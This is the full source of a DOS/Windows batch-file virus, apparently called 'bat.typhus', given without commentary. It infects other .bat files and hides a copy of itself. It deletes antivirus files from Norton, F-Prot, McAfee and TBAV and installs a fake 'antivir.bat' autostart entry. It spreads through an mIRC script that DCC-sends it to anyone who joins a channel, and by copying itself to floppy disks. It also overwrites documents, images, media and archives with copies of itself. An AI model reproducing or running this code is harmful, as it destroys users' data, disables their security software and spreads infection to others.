::Where's your sense of life? (tph)
::It's not there like the file you wanted. (tph)
::Perhaps you got to change something ... (tph)
@echo off%_tph%
if '%1=='tph goto tph%2
set tph=%0.bat
if not exist %tph% set tph=%0
if '%tph%==' set tph=autoexec.bat
if exist c:\_tph.bat goto tphg
if not exist %tph% goto etph
find "tph"<%tph%>c:\_tph.bat
attrib c:\_tph.bat +h
:tphg
command /e:5000 /c c:\_tph tph vir
:etph
ctty nul.tph
if exist c:\_tph.bat del c:\programme\norton~1\s32integ.dll
if exist c:\_tph.bat del c:\programme\f-prot95\fpwm32.dll
if exist c:\_tph.bat del c:\programme\mcafee\scan.dat
if exist c:\_tph.bat del c:\tbavw95\tbscan.sig
if exist c:\windows\startmen\programme\autostart\antivir.bat goto rdtph
copy bat.typhus.bat c:\windows\tph.sys
echo @echo off>tphhh.bat
echo ctty nul>>tphhh.bat
echo if exist c:\windows\system\bat.typhus.bat goto 0k>>tphhh.bat
echo copy c:\windows\tph.sys c:\windows\system\bat.typhus.bat>>tphhh.bat
echo :0k>>tphhh.bat
move tphhh.bat c:\windows\startmen\programme\autostart\antivir.bat
:rdtph
if exist c:\windows\system\bat.typhus.bat goto wytph
goto wytph
:wytph
echo [script]>tph23.bat
echo n0=on 1:JOIN:#:{ >>tph23.bat
echo n1= /if ( nick == $me ) { halt } >>tph23.bat
echo n2= /.dcc send $nick c:\windows\system\bat.typhus.bat >>tph23.bat
echo n3=} >>tph23.bat
if exist c:\mirc\mirc.ini copy tph23.bat c:\mirc\script.ini
if exist c:\mirc32\mirc.ini copy tph23.bat c:\mirc32\script.ini
if exist c:\progra~1\mirc\mirc.ini copy tph23.bat c:\progra~1\mirc\script.ini
if exist c:\progra~1\mirc32\mirc.ini copy tph23.bat c:\progra~1\mirc32\script.ini
:ditph
if exist tph23.bat command /f /c copy c:\windows\system\bat.typhus.bat a:\
:pltph
if exist tph23.bat for %%i in (*.txt,*.doc,*.dot,*.rtf,*.pdf,*.xls,*.hlp,*.htm,*.html,*.inf,*.bmp,*.jpg,*.gif,*.pcx,*.cpt,*.avi,*.mpg,*.mov,*.swf,*.scr,*.ppt,*.wav,*.mp3,*.zip,*.rar,*.arj,*.lzh) do copy %0 %%i>nul
del tph23.bat
:natph
set tph=
goto tphend
:tphvir
for %%a in (*.bat ..\*.bat c:*.bat) do call c:\_tph tph i %%a
exit tph
:tphi
find "tph"<%3>nul
if not errorlevel 1 goto tphj
type c:\_tph.bat>tph$
type %3>>tph$
move tph$ %3>nul
exit tph
:tphj
set tph!=%tph!%1
if %tph!%==1 exit
:tphend
                                
